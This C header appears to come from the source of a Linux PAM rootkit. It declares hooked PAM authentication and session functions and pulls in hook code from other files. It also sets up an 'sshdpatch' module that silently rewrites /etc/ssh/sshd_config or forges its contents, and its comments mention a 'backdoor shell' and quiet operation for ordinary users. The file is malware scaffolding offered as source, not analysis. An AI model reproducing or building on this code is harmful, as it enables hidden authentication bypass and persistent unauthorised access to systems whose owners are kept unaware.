#ifndef __PAM_H
#define __PAM_H
#include "pam_private.h"

int pam_authenticate(pam_handle_t *pamh, int flags);
int pam_open_session(pam_handle_t *pamh, int flags);
int pam_acct_mgmt(pam_handle_t *pamh, int flags);
#include "pam_hooks.c"

void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...);
void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args);
#include "pam_syslog.c"

#ifdef SSHD_PATCH_HARD

/* if the size of /etc/ssh/sshd_config's contents
 * is larger than this number, only allocate memory
 * for up to this number. default limit is 8kb. comment out
 * to disable this & allocate the memory regardless of size. */
#define MAX_SSHD_SIZE 1024 * 8

#define MAGIC_USR 1 // sshdpatch will print stuff out when called from backdoor shell..
#define REG_USR   2 // stays totally quiet otherwise.

void addsetting(char *setting, char *value, char **buf);
size_t writesshd(char *buf);
int sshdok(int res[], char **buf, size_t *sshdsize);
void sshdpatch(void);
#include "sshdpatch/hard.c"

#endif

#ifdef SSHD_PATCH_SOFT
FILE *sshdforge(const char *pathname);
#include "sshdpatch/soft.c"
#endif

#endif
